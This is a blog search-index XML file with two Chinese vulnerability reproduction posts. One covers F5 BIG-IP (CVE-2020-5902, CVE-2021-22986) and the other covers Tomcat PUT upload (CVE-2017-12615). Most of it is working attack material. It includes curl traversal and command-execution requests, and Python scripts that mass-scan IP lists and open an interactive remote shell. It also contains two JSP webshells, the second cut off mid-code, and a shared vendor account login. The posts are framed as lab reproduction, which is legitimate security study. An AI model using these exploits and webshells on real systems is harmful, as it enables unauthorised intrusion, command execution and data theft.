<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>F5 BIG-IP 远程代码执行漏洞</title>
    <url>/2021/08/25/F5%20BIG-IP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><blockquote>
<p>未授权的远程攻击者通过向漏洞页面发送特制的请求包，可以造成任意 Java 代码执行。进而控制 <code>F5 BIG-IP</code> 的全部功能，包括但不限于: 执行任意系统命令、开启/禁用服务、创建/删除服务器端文件等。该漏洞影响控制面板受影响，不影响数据面板。</p>
</blockquote>
<span id="more"></span>

<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BIG-IP 15.x: 15.1.0/15.0.0</span><br><span class="line">BIG-IP 14.x: 14.1.0 ~ 14.1.2</span><br><span class="line">BIG-IP 13.x: 13.1.0 ~ 13.1.3</span><br><span class="line">BIG-IP 12.x: 12.1.0 ~ 12.1.5</span><br><span class="line">BIG-IP 11.x: 11.6.1 ~ 11.6.5</span><br></pre></td></tr></table></figure>

<h2 id="FOFA语句"><a href="#FOFA语句" class="headerlink" title="FOFA语句"></a>FOFA语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">icon_hash=&quot;-335242539&quot;</span><br></pre></td></tr></table></figure>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>在官网下载vmware文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://downloads.f5.com/esd/ecc.sv?sw=BIG-IP&amp;pro=big-ip_v15.x&amp;ver=15.1.0&amp;container=Virtual-Edition</span><br></pre></td></tr></table></figure>

<p>直接访问会跳转，需要注册个账号。或者直接使用以下账户进行登陆。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">F5登录账号：john12334@027168.com/John12334</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826200911098.png" alt="image-20210826200911098"></p>
<p>登陆成功后，下载ova文件格式</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826200932855.png" alt="image-20210826200932855"></p>
<p>导入Vmware:文件–&gt;打开–&gt;下一步导入虚拟机。导入后直接启动，使用系统默认账户：root/default登陆，随后修改默认密码。最后ifconfig。</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826200958844.png" alt="image-20210826200958844"></p>
<p>浏览器访问：<a href="https://192.168.240.147/tmui/login.jsp">https://192.168.240.147/tmui/login.jsp</a></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826201104572.png" alt="image-20210826201104572"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="F5-BIG-IP-远程代码执行漏洞-CVE-2020-5902"><a href="#F5-BIG-IP-远程代码执行漏洞-CVE-2020-5902" class="headerlink" title="F5 BIG-IP 远程代码执行漏洞 CVE-2020-5902"></a>F5 BIG-IP 远程代码执行漏洞 CVE-2020-5902</h3><p><a href="https://github.com/jas502n/CVE-2020-5902">详情利用方式 https://github.com/jas502n/CVE-2020-5902</a></p>
<p><a href="https://github.com/wx3514/CVE-2020-5902/blob/master/CVE-2020-5902.md">详情利用方式 https://github.com/wx3514/CVE-2020-5902/blob/master/CVE-2020-5902.md</a></p>
<p>漏洞验证：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 浏览器中访问</span><br><span class="line">https://192.168.240.147/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826201137886.png" alt="image-20210826201137886"></p>
<p>执行tmsh命令；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -k &quot;https://example.com/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin&quot;</span><br><span class="line">curl -k &quot;https://example.com/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd&quot;</span><br></pre></td></tr></table></figure>

<p>写入文件；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -k -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -X POST -d &quot;fileName=/tmp/success&amp;content=CVE-2020-5902&quot; &quot;https://example.com/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp&quot;</span><br></pre></td></tr></table></figure>

<p>读取文件；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -k &quot;https://example.com/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/tmp/success&quot;</span><br></pre></td></tr></table></figure>

<p>修改alias劫持list命令为bash；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -k &quot;https://example.com/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash&quot;</span><br><span class="line"># 写入bash文件</span><br><span class="line">curl -k &quot;https://example.com/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/test&amp;content=id&quot;</span><br><span class="line"># 执行bash文件</span><br><span class="line">curl -k &quot;https://example.com/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/test&quot;</span><br><span class="line"># 还原list命令</span><br><span class="line">curl -k &quot;https://example.com/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list&quot;</span><br></pre></td></tr></table></figure>

<h3 id="CVE-2020-5902漏洞POC"><a href="#CVE-2020-5902漏洞POC" class="headerlink" title="CVE-2020-5902漏洞POC"></a>CVE-2020-5902漏洞POC</h3><p>测试是否存在有此漏洞；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import json</span><br><span class="line">from requests.packages.urllib3.exceptions import InsecureRequestWarning</span><br><span class="line"></span><br><span class="line">def title():</span><br><span class="line">    print(&#x27;+------------------------------------------&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34mPOC_Des: 拾玖的猫                                   \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34mGithub : 拾玖的猫                                \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34m公众号 : 小拾玖的猫                                                     \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34mVersion: F5 BIG-IP                                                \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[36m使用格式: python3 CVE-2020-5902.py                                  \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+------------------------------------------&#x27;)</span><br><span class="line"></span><br><span class="line">def POC_1(target_url):</span><br><span class="line">    version_url = target_url + &quot;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd&quot;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;,</span><br><span class="line">        &quot;Accept-Language&quot;:&quot;zh-CN,zh;q=0.9&quot;,</span><br><span class="line">    &#125;</span><br><span class="line">    try:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.get(url=version_url, timeout=10, verify=False, headers=headers)</span><br><span class="line">        if &quot;output&quot; in response.text:</span><br><span class="line">            print(&quot;\033[32m[o] 目标 &#123;&#125; 存在漏洞，响应为:\n&#123;&#125;\033[0m&quot;.format(target_url, json.loads(response.text)[&quot;output&quot;]))</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;\033[31m[x] 目标漏洞无法利用 \033[0m&quot;)</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;\033[31m[x] 目标漏洞无法利用 ,&#123;&#125;\033[0m&quot;.format(e))</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    title()</span><br><span class="line">    target_url = str(input(&quot;\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m&quot;))</span><br><span class="line">    POC_1(target_url)</span><br></pre></td></tr></table></figure>

<h3 id="F5-BIG-IP-远程代码执行漏洞-CVE-2021-22986"><a href="#F5-BIG-IP-远程代码执行漏洞-CVE-2021-22986" class="headerlink" title="F5 BIG-IP 远程代码执行漏洞 CVE-2021-22986"></a>F5 BIG-IP 远程代码执行漏洞 CVE-2021-22986</h3><p>漏洞验证，访问如下页面。</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826201205590.png" alt="image-20210826201205590"></p>
<p>通过burp修改请求包；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mgmt/tm/util/bash HTTP/1.1</span><br><span class="line">Host: xxx.xxx.xxx.xxx:8443</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 41</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Authorization: Basic YWRtaW46QVNhc1M=</span><br><span class="line">X-F5-Auth-Token: </span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;command&quot;:&quot;run&quot;,&quot;utilCmdArgs&quot;:&quot;-c id&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826201222529.png" alt="image-20210826201222529"></p>
<p>成功执行命令id；</p>
<h3 id="CVE-2021-22986漏洞POC"><a href="#CVE-2021-22986漏洞POC" class="headerlink" title="CVE-2021-22986漏洞POC"></a>CVE-2021-22986漏洞POC</h3><p>1.批量测试漏洞IP站点POC</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import random</span><br><span class="line">import re</span><br><span class="line">import json</span><br><span class="line">from requests.packages.urllib3.exceptions import InsecureRequestWarning</span><br><span class="line"></span><br><span class="line">def title():</span><br><span class="line">    print(&#x27;+------------------------------------------&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34mPOC_Des: 小拾玖的猫                                            \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34mGithub : 小拾玖的猫                                                  \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34m公众号  : 小拾玖的猫                                                   \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34mVersion: F5 BIG-IP                                                  \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[36m使用格式:  python3 poc.py                                            \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[36mFile         &gt;&gt;&gt; ip.txt                             \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+------------------------------------------&#x27;)</span><br><span class="line"></span><br><span class="line">def POC_1(target_url):</span><br><span class="line">    vuln_url = target_url + &quot;/mgmt/tm/util/bash&quot;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;Authorization&quot;: &quot;Basic YWRtaW46QVNhc1M=&quot;,</span><br><span class="line">        &quot;X-F5-Auth-Token&quot;: &quot;&quot;,</span><br><span class="line">        &quot;Content-Type&quot;: &quot;application/json&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    data = &#x27;&#123;&quot;command&quot;:&quot;run&quot;,&quot;utilCmdArgs&quot;:&quot;-c id&quot;&#125;&#x27;</span><br><span class="line">    try:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=2)</span><br><span class="line">        if &quot;commandResult&quot; in response.text and response.status_code == 200:</span><br><span class="line">            print(&quot;\033[32m[o] 目标 &#123;&#125;存在漏洞,响应为:&#123;&#125; \033[0m&quot;.format(target_url, json.loads(response.text)[&quot;commandResult&quot;]))</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;\033[31m[x] 目标 &#123;&#125;不存在漏洞 \033[0m&quot;.format(target_url))</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;\033[31m[x] 目标 &#123;&#125; 请求失败 \033[0m&quot;.format(target_url))</span><br><span class="line"></span><br><span class="line">def Scan(file_name):</span><br><span class="line">    with open(file_name, &quot;r&quot;, encoding=&#x27;utf8&#x27;) as scan_url:</span><br><span class="line">        for url in scan_url:</span><br><span class="line">            if url[:4] != &quot;http&quot;:</span><br><span class="line">                url = &quot;https://&quot; + url</span><br><span class="line">            url = url.strip(&#x27;\n&#x27;)</span><br><span class="line">            try:</span><br><span class="line">                POC_1(url)</span><br><span class="line"></span><br><span class="line">            except Exception as e:</span><br><span class="line">                print(&quot;\033[31m[x] 请求报错 \033[0m&quot;.format(e))</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    title()</span><br><span class="line">    file_name  = str(input(&quot;\033[35mPlease input Attack File\nFile &gt;&gt;&gt; \033[0m&quot;))</span><br><span class="line">    Scan(file_name)</span><br></pre></td></tr></table></figure>

<p>2.命令执行POC</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import random</span><br><span class="line">import re</span><br><span class="line">import base64</span><br><span class="line">import time</span><br><span class="line">import json</span><br><span class="line">from requests.packages.urllib3.exceptions import InsecureRequestWarning</span><br><span class="line"></span><br><span class="line">def title():</span><br><span class="line">    print(&#x27;+------------------------------------------&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34mPOC_Des: 小拾玖的猫                                   \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34mGithub : 小拾玖的猫                                \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34m公众号  : 小拾玖的猫                                                   \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[34mVersion: F5 BIG-IP                                                \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[36m使用格式:  python3 poc.py                                            \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m&#x27;)</span><br><span class="line">    print(&#x27;+------------------------------------------&#x27;)</span><br><span class="line"></span><br><span class="line">def POC_1(target_url):</span><br><span class="line">    vuln_url = target_url + &quot;/mgmt/tm/util/bash&quot;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;Authorization&quot;: &quot;Basic YWRtaW46QVNhc1M=&quot;,</span><br><span class="line">        &quot;X-F5-Auth-Token&quot;: &quot;&quot;,</span><br><span class="line">        &quot;Content-Type&quot;: &quot;application/json&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    data = &#x27;&#x27;&#x27;&#123;&quot;command&quot;:&quot;run&quot;,&quot;utilCmdArgs&quot;:&quot;-c &#x27;cat /etc/passwd&#x27;&quot;&#125;&#x27;&#x27;&#x27;</span><br><span class="line">    try:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)</span><br><span class="line">        if &#x27;root&#x27; in response.text and response.status_code == 200:</span><br><span class="line">            print(&quot;\033[32m[o] 目标 &#123;&#125;存在漏洞,响应为:&#123;&#125; \033[0m&quot;.format(target_url, json.loads(response.text)[&quot;commandResult&quot;]))</span><br><span class="line">            while True:</span><br><span class="line">                Cmd = str(input(&quot;\033[35mCmd &gt;&gt;&gt; \033[0m&quot;))</span><br><span class="line">                POC_2(target_url, Cmd)</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;\033[31m[x] 目标 &#123;&#125;不存在漏洞 \033[0m&quot;.format(target_url))</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;\033[31m[x] 目标 &#123;&#125; 请求失败 \033[0m&quot;.format(target_url), e)</span><br><span class="line"></span><br><span class="line">def POC_2(target_url, Cmd):</span><br><span class="line">    vuln_url = target_url + &quot;/mgmt/tm/util/bash&quot;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;Authorization&quot;: &quot;Basic YWRtaW46QVNhc1M=&quot;,</span><br><span class="line">        &quot;X-F5-Auth-Token&quot;: &quot;&quot;,</span><br><span class="line">        &quot;Content-Type&quot;: &quot;application/json&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    Cmd = &quot;&#x27;&quot; + Cmd + &quot;&#x27;&quot;</span><br><span class="line">    data = &#x27;&#123;&quot;command&quot;:&quot;run&quot;,&quot;utilCmdArgs&quot;:&quot;-c %s&quot;&#125;&#x27; % Cmd</span><br><span class="line">    try:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)</span><br><span class="line">        print(&quot;\033[32m&#123;&#125; \033[0m&quot;.format(json.loads(response.text)[&quot;commandResult&quot;]))</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;\033[31m[x] 命令执行失败 \033[0m&quot;.format(target_url), e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    title()</span><br><span class="line">    target_url = str(input(&quot;\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m&quot;))</span><br><span class="line">    POC_1(target_url)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>WEB-RCE</category>
      </categories>
  </entry>
  <entry>
    <title>Tomcat 任意上传漏洞(CVE-2017-12615)</title>
    <url>/2021/08/25/Tomcat%20%E4%BB%BB%E6%84%8F%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(CVE-2017-12615)/</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><blockquote>
<p>2017年9月19日，Apache Tomcat官方确认并修复了两个高危漏洞，其中就有远程代码执行漏洞(CVE-2017-12615)。当 启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限。</p>
</blockquote>
<span id="more"></span>

<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache Tomcat 7.0.0 - 7.0.81</span><br></pre></td></tr></table></figure>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><strong>1. docker搭建；</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/vulhub/vulhub.git</span><br><span class="line">cd vulhub/tomcat/CVE-2017-12615</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>访问 <a href="http://xxx.xxx.xxx.xxx:8080/">http://xxx.xxx.xxx.xxx:8080/</a> 正常即可;</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826203327824.png" alt="image-20210826203327824"></p>
<p><strong>2. windows搭建；</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">环境：</span><br><span class="line">windows 7/Java1.8.0/tomcat7.0.70</span><br></pre></td></tr></table></figure>

<p><a href="https://www.cnblogs.com/maoning/p/10701349.html">安装Java环境</a>;</p>
<p>安装tomcat环境;<a href="https://github.com/apache/tomcat/releases">tomcat历史版本下载</a></p>
<p>进入apache-tomcat-7.0.70\bin文件并新起cmd执行；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">startup.bat</span><br></pre></td></tr></table></figure>

<p><a href="https://gblfy.blog.csdn.net/article/details/90493722">报错解决</a>：</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826203910827.png" alt="image-20210826203910827"></p>
<p>在setclasspath.bat（Linux为setclasspath.sh,并将set改为export）的开头手动添加环境变量。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set JAVA_HOME=C:\Program Files (x86)\Java\bin</span><br><span class="line">set JRE_HOME=C:\Program Files (x86)\Java\jre</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826204131112.png" alt="image-20210826204131112"></p>
<p>保存后再次cmd执行；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">startup.bat</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826204220268.png" alt="image-20210826204220268"></p>
<p>环境启动成功。</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>漏洞产生的主要原因来自于<strong>conf/web.xml</strong>文件配置错误,readonly开启了false,导致可以使用<strong>PUT/DELETE</strong>请求方法操作文件；</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826204703445.png" alt="image-20210826204703445"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>浏览器打开<a href="http://127.0.0.1:8080/">http://127.0.0.1:8080/</a></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826204406230.png" alt="image-20210826204406230"></p>
<p>浏览器中刷新一下页面，brup中将会捕获到流量；</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826204431390.png" alt="image-20210826204431390"></p>
<p>使用PUT请求方式写入hacker.jsp webshell，如下图操作；</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826204445757.png" alt="image-20210826204445757"></p>
<p>hacker.jsp如下；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%!public static String excuteCmd(String c) &#123;StringBuilder line = new StringBuilder();try &#123;Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) &#123;line.append(temp</span><br><span class="line"></span><br><span class="line">+&quot;\\n&quot;);&#125;buf.close();&#125; catch (Exception e) &#123;line.append(e.getMessage());&#125;return line.toString();&#125;%&gt;&lt;%if(&quot;safedog&quot;.equals(request.getParameter(&quot;pwd&quot;))&amp;&amp;!&quot;&quot;.equals(request.getParameter(&quot;cmd&quot;)))&#123;out.println(&quot;&lt;pre&gt;&quot;+excuteCmd(request.getParameter(&quot;cmd&quot;))+&quot;&lt;/pre&gt;&quot;);&#125;else&#123;out.println(&quot;:-)&quot;);&#125;%&gt;</span><br></pre></td></tr></table></figure>

<p>Response中返回HTTP/1.1 201 Created，说明文件创建成功。</p>
<p>浏览器访问：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.40.137:8080/hacker.jsp?pwd=safedog&amp;cmd=ipconfig</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210826204538095.png" alt="image-20210826204538095"></p>
<h3 id="漏洞验证脚本"><a href="#漏洞验证脚本" class="headerlink" title="漏洞验证脚本"></a>漏洞验证脚本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/ianxtianxt/CVE-2017-12615</span><br></pre></td></tr></table></figure>



<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>（需使用菜刀链接）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PUT /webshell.jsp/ HTTP/1.1  </span><br><span class="line">Host: 127.0.0.1:8080  </span><br><span class="line">Content-Length: 6239  </span><br><span class="line">&lt;%@page import=&quot;java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*&quot;%&gt;  </span><br><span class="line">&lt;%!  </span><br><span class="line">  String Pwd = &quot;hetian&quot;;  </span><br><span class="line">  String cs = &quot;UTF-8&quot;;  </span><br><span class="line">   String EC(String s) throws Exception &#123;  </span><br><span class="line">       return new String(s.getBytes(&quot;ISO-8859-1&quot;),cs);  </span><br><span class="line">   &#125;  </span><br><span class="line">   Connection GC(String s) throws Exception &#123;  </span><br><span class="line">       String[] x = s.trim().split(&quot;choraheiheihei&quot;);  </span><br><span class="line">     Class.forName(x[0].trim());  </span><br><span class="line">      if(x[1].indexOf(&quot;jdbc:oracle&quot;)!=-1)&#123;  </span><br><span class="line">          return DriverManager.getConnection(x[1].trim()+&quot;:&quot;+x[4],x[2].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[2],x[3].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[3]);  </span><br><span class="line">      &#125;else&#123;  </span><br><span class="line">          Connection c = DriverManager.getConnection(x[1].trim(),x[2].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[2],x[3].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[3]);  </span><br><span class="line">        if (x.length &gt; 4) &#123;  </span><br><span class="line">              c.setCatalog(x[4]);  </span><br><span class="line">          &#125;  </span><br><span class="line">          return c;  </span><br><span class="line">       &#125;  </span><br><span class="line">   &#125;  </span><br><span class="line">  void AA(StringBuffer sb) throws Exception &#123;  </span><br><span class="line">      File k = new File(&quot;&quot;);  </span><br><span class="line">      File r[] = k.listRoots();  </span><br><span class="line">       for (int i = 0; i &lt; r.length; i++) &#123;  </span><br><span class="line">         sb.append(r[i].toString().substring(0, 2));  </span><br><span class="line">     &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">   void BB(String s, StringBuffer sb) throws Exception &#123;  </span><br><span class="line">       File oF = new File(s), l[] = oF.listFiles();  </span><br><span class="line">     String sT, sQ, sF = &quot;&quot;;  </span><br><span class="line">        java.util.Date dt;  </span><br><span class="line">      SimpleDateFormat fm = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);  </span><br><span class="line">     for (int i = 0; i &lt; l.length; i++) &#123;  </span><br><span class="line">          dt = new java.util.Date(l[i].lastModified());  </span><br><span class="line">           sT = fm.format(dt);  </span><br><span class="line">           sQ = l[i].canRead() ? &quot;R&quot; : &quot;&quot;;  </span><br><span class="line">           sQ += l[i].canWrite() ? &quot; W&quot; : &quot;&quot;;  </span><br><span class="line">           if (l[i].isDirectory()) &#123;  </span><br><span class="line">               sb.append(l[i].getName() + &quot;/\t&quot; + sT + &quot;\t&quot; + l[i].length()+ &quot;\t&quot; + sQ + &quot;\n&quot;);  </span><br><span class="line">          &#125; else &#123;  </span><br><span class="line">               sF+=l[i].getName() + &quot;\t&quot; + sT + &quot;\t&quot; + l[i].length() + &quot;\t&quot;+ sQ + &quot;\n&quot;;  </span><br><span class="line">           &#125;  </span><br><span class="line">       &#125;  </span><br><span class="line">       sb.append(sF);  </span><br><span class="line">   &#125;  </span><br><span class="line">   void EE(String s) throws Exception &#123;  </span><br><span class="line">       File f = new File(s);  </span><br><span class="line">      if (f.isDirectory()) &#123;  </span><br><span class="line">           File x[] = f.listFiles();  </span><br><span class="line">           for (int k = 0; k &lt; x.length; k++) &#123;  </span><br><span class="line">               if (!x[k].delete()) &#123;  </span><br><span class="line">                  EE(x[k].getPath());  </span><br><span class="line">               &#125;  </span><br><span class="line">           &#125;  </span><br><span class="line">       &#125;  </span><br><span class="line">      f.delete();  </span><br><span class="line">&#125;  </span><br><span class="line">  void FF(String s, HttpServletResponse r) throws Exception &#123;  </span><br><span class="line">       int n;  </span><br><span class="line">     byte[] b = new byte[512];  </span><br><span class="line">     r.reset();  </span><br><span class="line">     ServletOutputStream os = r.getOutputStream();  </span><br><span class="line">       BufferedInputStream is = new BufferedInputStream(new FileInputStream(s));  </span><br><span class="line">       os.write((&quot;-&gt;&quot; + &quot;|&quot;).getBytes(), 0, 3);  </span><br><span class="line">      while ((n = is.read(b, 0, 512)) != -1) &#123;  </span><br><span class="line">           os.write(b, 0, n);  </span><br><span class="line">     &#125;  </span><br><span class="line">   os.write((&quot;|&quot; + &quot;&lt;-&quot;).getBytes(), 0, 3);  </span><br><span class="line">       os.close();  </span><br><span class="line">     is.close();  </span><br><span class="line">  &#125;  </span><br><span class="line">  void GG(String s, String d) throws Exception &#123;  </span><br><span class="line">     String h = &quot;0123456789ABCDEF&quot;;  </span><br><span class="line">      File f = new File(s);  </span><br><span class="line">      f.createNewFile();  </span><br><span class="line">     FileOutputStream os = new FileOutputStream(f);  </span><br><span class="line">      for (int i = 0; i &lt; d.length(); i += 2) &#123;  </span><br><span class="line">        os.write((h.indexOf(d.charAt(i)) &lt;&lt; 4 | h.indexOf(d.charAt(i + 1))));  </span><br><span class="line">     &#125;  </span><br><span class="line">    os.close();  </span><br><span class="line">  &#125;  </span><br><span class="line">  void HH(String s, String d) throws Exception &#123;  </span><br><span class="line">      File sf = new File(s), df = new File(d);  </span><br><span class="line">       if (sf.isDirectory()) &#123;  </span><br><span class="line">          if 